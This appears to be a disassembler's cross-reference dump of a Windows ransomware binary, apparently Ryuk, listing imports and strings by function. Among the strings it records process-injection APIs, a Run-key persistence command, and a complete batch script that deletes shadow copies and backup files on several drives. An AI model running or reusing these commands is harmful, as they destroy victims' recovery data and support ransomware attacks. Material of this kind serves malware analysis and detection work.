reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1400021fd	0x140018010	import	0x140002170	ADVAPI32.dll.AdjustTokenPrivileges
0x140002207	0x140018060	import	0x140002170	KERNEL32.dll.GetLastError
0x14000220f	0x14001fef0	string	0x140002170	AdjustTokenPrivileges error: %u\n
0x140002225	0x1400080f0	string	0x140002170	H;\r\t
0x140002230	0x140018060	import	0x140002170	KERNEL32.dll.GetLastError
0x14000223d	0x14001ff18	string	0x140002170	The token does not have the specified privilege. \n
0x140002253	0x1400080f0	string	0x140002170	H;\r\t
0x14000226b	0x1400080f0	string	0x140002170	H;\r\t
0x1400022d6	0x140018050	import	0x140002280	KERNEL32.dll.CreateToolhelp32Snapshot
0x1400022f1	0x140018090	import	0x140002280	KERNEL32.dll.Process32FirstW
0x140002307	0x140018068	import	0x140002280	KERNEL32.dll.Process32NextW
0x140002332	0x140018118	import	0x140002280	KERNEL32.dll.SetLastError
0x140002344	0x140018048	import	0x140002280	KERNEL32.dll.OpenProcess
0x140002386	0x140018020	import	0x140002280	ADVAPI32.dll.OpenProcessToken
0x1400023ad	0x140018038	import	0x140002280	ADVAPI32.dll.GetTokenInformation
0x1400023b7	0x1400180d0	import	0x140002280	KERNEL32.dll.GetProcessHeap
0x1400023c8	0x1400180a8	import	0x140002280	KERNEL32.dll.HeapAlloc
0x1400023ed	0x140018038	import	0x140002280	ADVAPI32.dll.GetTokenInformation
0x140002430	0x140018030	import	0x140002280	ADVAPI32.dll.LookupAccountSidW
0x14000243f	0x140018080	import	0x140002280	KERNEL32.dll.GlobalAlloc
0x140002451	0x140018080	import	0x140002280	KERNEL32.dll.GlobalAlloc
0x140002480	0x140018030	import	0x140002280	ADVAPI32.dll.LookupAccountSidW
0x1400024ab	0x140018128	import	0x140002280	KERNEL32.dll.GlobalFree
0x1400024b4	0x140018128	import	0x140002280	KERNEL32.dll.GlobalFree
0x1400024c5	0x1400180d0	import	0x140002280	KERNEL32.dll.GetProcessHeap
0x1400024d6	0x140018120	import	0x140002280	KERNEL32.dll.HeapFree
0x1400024f3	0x1400180a0	import	0x140002280	KERNEL32.dll.CloseHandle
0x140002501	0x140018068	import	0x140002280	KERNEL32.dll.Process32NextW
0x140002522	0x1400180a0	import	0x140002280	KERNEL32.dll.CloseHandle
0x140002537	0x1400080f0	string	0x140002280	H;\r\t
0x14000258b	0x1400180b0	import	0x140002560	KERNEL32.dll.GetWindowsDirectoryW
0x1400025af	0x14001ff50	string	0x140002560	\Documents and Settings\Default User\sys
0x14000260a	0x14001ffa8	string	0x140002560	\users\Public\sys
0x14000262a	0x140018118	import	0x140002560	KERNEL32.dll.SetLastError
0x140002655	0x1400180f8	import	0x140002560	KERNEL32.dll.CreateFileW
0x14000265e	0x140018060	import	0x140002560	KERNEL32.dll.GetLastError
0x14000266c	0x1400180a0	import	0x140002560	KERNEL32.dll.CloseHandle
0x1400026a7	0x1400180f8	import	0x140002560	KERNEL32.dll.CreateFileW
0x1400026c0	0x1400080f0	string	0x140002560	H;\r\t
0x1400026fd	0x140018118	import	0x1400026e0	KERNEL32.dll.SetLastError
0x14000270d	0x140018048	import	0x1400026e0	KERNEL32.dll.OpenProcess
0x140002729	0x140018098	import	0x1400026e0	KERNEL32.dll.GetModuleHandleA
0x14000274a	0x140018118	import	0x1400026e0	KERNEL32.dll.SetLastError
0x140002769	0x1400180c0	import	0x1400026e0	KERNEL32.dll.VirtualAllocEx
0x140002777	0x140018060	import	0x1400026e0	KERNEL32.dll.GetLastError
0x140002790	0x1400180a0	import	0x1400026e0	KERNEL32.dll.CloseHandle
0x1400027bd	0x1400182e0	import	0x1400026e0	KERNEL32.dll.WriteProcessMemory
0x1400027ca	0x1400180a0	import	0x1400026e0	KERNEL32.dll.CloseHandle
0x1400027df	0x1400180e8	import	0x1400026e0	KERNEL32.dll.VirtualFreeEx
0x14000280e	0x1400180e0	import	0x1400026e0	KERNEL32.dll.CreateRemoteThread
0x140002819	0x140018060	import	0x1400026e0	KERNEL32.dll.GetLastError
0x140002822	0x1400180a0	import	0x1400026e0	KERNEL32.dll.CloseHandle
0x140002837	0x1400180e8	import	0x1400026e0	KERNEL32.dll.VirtualFreeEx
0x14000285e	0x1400080f0	string	0x1400026e0	H;\r\t
0x1400028e8	0x14001ffd0	string	0x140002880	RyukReadMe.txt
0x140002922	0x140018118	import	0x140002880	KERNEL32.dll.SetLastError
0x140002ad5	0x14001fff0	string	0x140002a20	\System32\cmd.exe
0x140002b9c	0x140020020	string	0x140002a20	\Documents and Settings\Default User\
0x140002bec	0x140020070	string	0x140002a20	\users\Public\
0x140002c3e	0x140002c51	string	0x140002a20	fD95
0x140002cb2	0x14001fe18	string	0x140002a20	PUBLIC
0x140002d98	0x140005310	string	0x140002a20	@USVWH
0x140002db7	0x140005310	string	0x140002a20	@USVWH
0x1400036ea	0x140005310	string	0x140002a20	@USVWH
0x1400037e5	0x140029f10	string	0x140002a20	/3*\e>
0x140003810	0x140024a10	string	0x140002a20	/3*\e>
0x140003878	0x1400080f0	string	0x140002a20	H;\r\t
0x140003b38	0x140020098	string	0x1400039e0	keystorage2
0x140003b74	0x140029f10	string	0x1400039e0	/3*\e>
0x140003b8f	0x140029f10	string	0x1400039e0	/3*\e>
0x140003bba	0x140029f10	string	0x1400039e0	/3*\e>
0x140003be5	0x140024a10	string	0x1400039e0	/3*\e>
0x140003c0a	0x140024a10	string	0x1400039e0	/3*\e>
0x140003c35	0x140024a10	string	0x1400039e0	/3*\e>
0x140003c60	0x140024a10	string	0x1400039e0	/3*\e>
0x140003c89	0x140024a10	string	0x1400039e0	/3*\e>
0x140003ca4	0x140024a10	string	0x1400039e0	/3*\e>
0x140003ccb	0x140024a10	string	0x1400039e0	/3*\e>
0x140003cf2	0x140024a10	string	0x1400039e0	/3*\e>
0x14000413c	0x140024a80	string	0x1400039e0	UNIQUE_ID_DO_NOT_REMOVE
0x14000429b	0x140029f10	string	0x1400039e0	/3*\e>
0x1400042c2	0x140024a10	string	0x1400039e0	/3*\e>
0x140004306	0x1400080f0	string	0x1400039e0	H;\r\t
0x140004428	0x14001fe18	string	0x140004320	PUBLIC
0x14000448b	0x1400039e0	string	0x140004320	@USAVH
0x14000449b	0x1400080f0	string	0x140004320	H;\r\t
0x1400044f8	0x140029f10	string	0x1400044c0	/3*\e>
0x140004513	0x140029f10	string	0x1400044c0	/3*\e>
0x140004542	0x140029f10	string	0x1400044c0	/3*\e>
0x14000457f	0x140024a10	string	0x1400044c0	/3*\e>
0x14000459a	0x140024a10	string	0x1400044c0	/3*\e>
0x1400045c5	0x140024a10	string	0x1400044c0	/3*\e>
0x1400045f0	0x140024a10	string	0x1400044c0	/3*\e>
0x1400052f8	0x1400080f0	string	0x140004700	H;\r\t
0x1400061c9	0x140005310	string	0x140005310	@USVWH
0x140006676	0x140004700	string	0x140005310	@USWAVH
0x1400066c5	0x1400080f0	string	0x140005310	H;\r\t
0x1400068b1	0x1400293c4	string	0x140006840	lTGg_
0x14000690e	0x1400280d0	string	0x140006840	.5(\r
0x140006abb	0x140029e80	string	0x140006840	>/:\f#
0x140006afb	0x14002a908	string	0x140006840	>\t=\b#
0x140006cbb	0x140029f10	string	0x140006840	/3*\e>
0x140006cfd	0x140024a10	string	0x140006840	/3*\e>
0x140006ff2	0x140018078	import	0x140006840	KERNEL32.dll.LoadLibraryA
0x140007002	0x1400280d0	string	0x140006840	.5(\r
0x140007009	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007033	0x140028cec	string	0x140006840	\r6,ZcL>%
0x14000705b	0x1400200e0	string	0x140006840	Iphlpapi.dll
0x140007076	0x1400200f0	string	0x140006840	GetLastError
0x140007084	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000709f	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400070ba	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400070c7	0x1400285b2	string	0x140006840	&?%\f%\a
0x1400070d5	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400070e2	0x1400288a0	string	0x140006840	%?=-#\v,,=(
0x1400070e9	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400070f6	0x140028454	string	0x140006840	%?=*>
0x140007104	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007111	0x14002883c	string	0x140006840	%?=:%
0x140007118	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007125	0x140028166	string	0x140006840	$3'\r
0x14000712c	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007147	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007154	0x140028b5c	string	0x140006840	%?=<"\a(\a\b<\a\e
0x140007162	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007176	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007183	0x1400281ca	string	0x140006840	55>_e0??\f#
0x140007191	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000719e	0x1400283f0	string	0x140006840	!(,\b%\a\n;
0x1400071a5	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400071d1	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400071de	0x140028648	string	0x140006840	%?=?4
0x1400071ec	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400071f9	0x14002851c	string	0x140006840	55>_e&3:\b3
0x140007200	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000720d	0x140020100	string	0x140006840	GetSystemDefaultLangID
0x140007214	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007221	0x140028b8e	string	0x140006840	%?=<"\a(\a\b<\a\r
0x140007228	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007235	0x1400285e4	string	0x140006840	0?(\r
0x14000723c	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007249	0x140028c24	string	0x140006840	0?.8$\a(0?0
0x140007257	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000726b	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007278	0x140028cba	string	0x140006840	0?.:4
0x140007286	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007293	0x140028c56	string	0x140006840	0?.*=\r),"4\e
0x14000729a	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400072ae	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400072bb	0x14002880a	string	0x140006840	1?=/8
0x1400072c2	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400072cf	0x140028710	string	0x140006840	53',)\a9
0x1400072dd	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400072f1	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007305	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007312	0x140028742	string	0x140006840	16,\f!
0x140007320	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000732d	0x1400287a6	string	0x140006840	%?=*$
0x14000733b	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000734f	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000735c	0x140028616	string	0x140006840	%?=/8
0x14000736a	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007377	0x1400284b8	string	0x140006840	%6&\v0
0x140007385	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007392	0x1400286de	string	0x140006840	$3'\r
0x1400073a0	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400073ad	0x140020118	string	0x140006840	WaitForMultipleObjects
0x1400073bb	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400073c8	0x140028198	string	0x140006840	%?=$>
0x1400073cf	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400073e3	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400073f0	0x1400283be	string	0x140006840	%?=$>
0x1400073f7	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007404	0x1400284ea	string	0x140006840	%?=$>
0x14000740b	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007418	0x14002822e	string	0x140006840	!(,\b%\a
0x14000741f	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000742c	0x140020130	string	0x140006840	GetFileSizeEx
0x140007433	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000744e	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000745b	0x1400287d8	string	0x140006840	%?=%>
0x140007469	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007484	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007491	0x140028bf2	string	0x140006840	0?.&!\a4
0x14000749f	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400074b3	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400074c0	0x1400282c4	string	0x140006840	%?=>8\f>&
0x1400074ce	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400074db	0x14002854e	string	0x140006840	1?=/8
0x1400074e9	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400074f6	0x140028bc0	string	0x140006840	0?.&!\a4
0x1400074fd	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000750a	0x1400281fc	string	0x140006840	1?=/8
0x140007511	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000751e	0x14002886e	string	0x140006840	%?==8
0x14000752c	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007539	0x14002867a	string	0x140006840	%?=/8
0x140007540	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000754d	0x140028134	string	0x140006840	$3'\r
0x140007554	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000756f	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000757c	0x140020140	string	0x140006840	MoveFileExW
0x14000758a	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000759e	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400075b9	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400075cd	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400075e1	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400075ee	0x140020150	string	0x140006840	SetFilePointerEx
0x1400075fc	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007617	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007624	0x140028486	string	0x140006840	$(,\f
0x14000762b	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007638	0x14002838c	string	0x140006840	!(,\b%\a\n;
0x140007646	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007653	0x1400282f6	string	0x140006840	!(,\b%\a
0x14000765a	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007667	0x140020168	string	0x140006840	CreateThread
0x14000766e	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x140007682	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000768f	0x140028d50	string	0x140006840	!5\n\e4
0x14000769d	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400076aa	0x140028328	string	0x140006840	!(,\b%\a
0x1400076b1	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400076be	0x1400286ac	string	0x140006840	%?=/8
0x1400076cc	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400076e0	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x1400076ed	0x140028c88	string	0x140006840	0?.-4
0x1400076fb	0x1400180b8	import	0x140006840	KERNEL32.dll.GetProcAddress
0x14000770a	0x1400080f0	string	0x140006840	H;\r\t
0x1400077a0	0x1400180f0	import	0x140007730	KERNEL32.dll.GetVersionExW
0x1400077bb	0x1400080f0	string	0x140007730	H;\r\t
0x1400079f3	0x1400293c4	string	0x1400077d0	lTGg_
0x140007a46	0x140020180	string	0x1400077d0	vssadmin Delete Shadows /all /quiet\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\r\nvssadmin Delete Shadows /all /quiet\r\ndel /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk\r\ndel /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk\r\ndel /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk\r\ndel /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk\r\ndel /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk\r\ndel /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk\r\ndel %0
0x140007cdf	0x1400080f0	string	0x1400077d0	H;\r\t
0x140007d29	0x140020778	string	0x140007d10	kernel32.dll
0x140007d38	0x140018078	import	0x140007d10	KERNEL32.dll.LoadLibraryA
0x140007d49	0x140020788	string	0x140007d10	IsWow64Process
0x140007d78	0x1400180b8	import	0x140007d10	KERNEL32.dll.GetProcAddress
0x140007d86	0x140018108	import	0x140007d10	KERNEL32.dll.GetCurrentProcess
0x140007d99	0x1400180d8	import	0x140007d10	KERNEL32.dll.FreeLibrary
0x140007dab	0x1400080f0	string	0x140007d10	H;\r\t
0x140007dfe	0x1400180b0	import	0x140007dc0	KERNEL32.dll.GetWindowsDirectoryW
0x140007e6a	0x14001fff0	string	0x140007dc0	\System32\cmd.exe
0x140007e9d	0x140018100	import	0x140007dc0	KERNEL32.dll.GetModuleFileNameW
0x140007ea3	0x1400207a0	string	0x140007dc0	/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
0x140008006	0x140020870	string	0x140007dc0	" /f
0x140008076	0x140020880	string	0x140007dc0	/reg:64
0x1400080a9	0x1400182f8	import	0x140007dc0	SHELL32.dll.ShellExecuteW
0x1400080bb	0x1400080f0	string	0x140007dc0	H;\r\t
0x14000811f	0x140018170	import	0x140008114	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008128	0x140018168	import	0x140008114	KERNEL32.dll.UnhandledExceptionFilter
0x14000812e	0x140018108	import	0x140008114	KERNEL32.dll.GetCurrentProcess
0x140008141	0x140018178	import	0x140008114	KERNEL32.dll.TerminateProcess
0x14000816d	0x14000833c	string	0x140008114	@SVWH
0x1400082d9	0x140018150	import	0x1400082cc	KERNEL32.dll.RtlCaptureContext
0x1400082f1	0x140018158	import	0x1400082cc	KERNEL32.dll.RtlLookupFunctionEntry
0x140008328	0x140018160	import	0x1400082cc	KERNEL32.dll.RtlVirtualUnwind
0x140008347	0x140018150	import	0x14000833c	KERNEL32.dll.RtlCaptureContext
0x140008361	0x140018158	import	0x14000833c	KERNEL32.dll.RtlLookupFunctionEntry
0x140008398	0x140018160	import	0x14000833c	KERNEL32.dll.RtlVirtualUnwind
0x1400088fc	0x1400181a0	import	0x1400088d0	KERNEL32.dll.GetSystemTimeAsFileTime
0x14000890a	0x140018198	import	0x1400088d0	KERNEL32.dll.GetCurrentThreadId
0x140008916	0x140018190	import	0x1400088d0	KERNEL32.dll.GetCurrentProcessId
0x140008926	0x140018188	import	0x1400088d0	KERNEL32.dll.QueryPerformanceCounter
0x140008993	0x1400181a8	import	0x14000898c	KERNEL32.dll.InitializeSListHead
0x140008a29	0x140018150	import	0x1400089e4	KERNEL32.dll.RtlCaptureContext
0x140008a43	0x140018158	import	0x1400089e4	KERNEL32.dll.RtlLookupFunctionEntry
0x140008a84	0x140018160	import	0x1400089e4	KERNEL32.dll.RtlVirtualUnwind
0x140008ad8	0x1400181b0	import	0x1400089e4	KERNEL32.dll.IsDebuggerPresent
0x140008af9	0x140018170	import	0x1400089e4	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008b04	0x140018168	import	0x1400089e4	KERNEL32.dll.UnhandledExceptionFilter
0x140008b48	0x1400181b8	import	0x140008b2c	KERNEL32.dll.GetStartupInfoW
0x140008b72	0x1400181c0	import	0x140008b6c	KERNEL32.dll.GetModuleHandleW
0x140008bc7	0x140018170	import	0x140008bc0	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008eb5	0x140018100	import	0x140008e84	KERNEL32.dll.GetModuleFileNameW
0x140008ecd	0x140018060	import	0x140008e84	KERNEL32.dll.GetLastError
0x140008f11	0x1400183c8	string	0x140008e84	Main Invoked.
0x140008f86	0x1400080f0	string	0x140008e84	H;\r\t
0x140008fcd	0x140018100	import	0x140008f9c	KERNEL32.dll.GetModuleFileNameW
0x140008fe5	0x140018060	import	0x140008f9c	KERNEL32.dll.GetLastError
0x140009029	0x1400183d8	string	0x140008f9c	Main Returned.
0x14000909e	0x1400080f0	string	0x140008f9c	H;\r\t
0x1400093f4	0x140018200	import	0x140009348	KERNEL32.dll.LoadLibraryExW
0x140009407	0x140018060	import	0x140009348	KERNEL32.dll.GetLastError
0x14000941a	0x140018200	import	0x140009348	KERNEL32.dll.LoadLibraryExW
0x140009457	0x1400180d8	import	0x140009348	KERNEL32.dll.FreeLibrary
0x14000948b	0x1400180b8	import	0x140009348	KERNEL32.dll.GetProcAddress
0x140009532	0x1400184b8	string	0x140009510	EventRegister
0x140009543	0x1400184b8	string	0x140009510	EventRegister
0x1400095c6	0x1400184d0	string	0x140009594	EventSetInformation
0x140009625	0x1400184e8	string	0x140009618	EventUnregister
0x140009638	0x1400184e8	string	0x140009618	EventUnregister
0x14000969f	0x140018500	string	0x14000966c	EventWriteTransfer
0x140009711	0x140018520	string	0x140009704	FlsAlloc
0x140009724	0x140018520	string	0x140009704	FlsAlloc
0x140009747	0x1400181e0	import	0x140009704	KERNEL32.dll.TlsAlloc
0x140009764	0x140018538	string	0x140009758	FlsFree
0x140009777	0x140018538	string	0x140009758	FlsFree
0x14000979b	0x1400181f8	import	0x140009758	KERNEL32.dll.TlsFree
0x1400097be	0x140018558	string	0x1400097ac	FlsSetValue
0x1400097c7	0x140018558	string	0x1400097ac	FlsSetValue
0x1400097fd	0x1400181f0	import	0x1400097ac	KERNEL32.dll.TlsSetValue
0x14000982b	0x140018570	string	0x140009814	InitializeCriticalSectionEx
0x14000983e	0x140018570	string	0x140009814	InitializeCriticalSectionEx
0x140009870	0x1400181d8	import	0x140009814	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x1400098e2	0x1400180d8	import	0x1400098c4	KERNEL32.dll.FreeLibrary
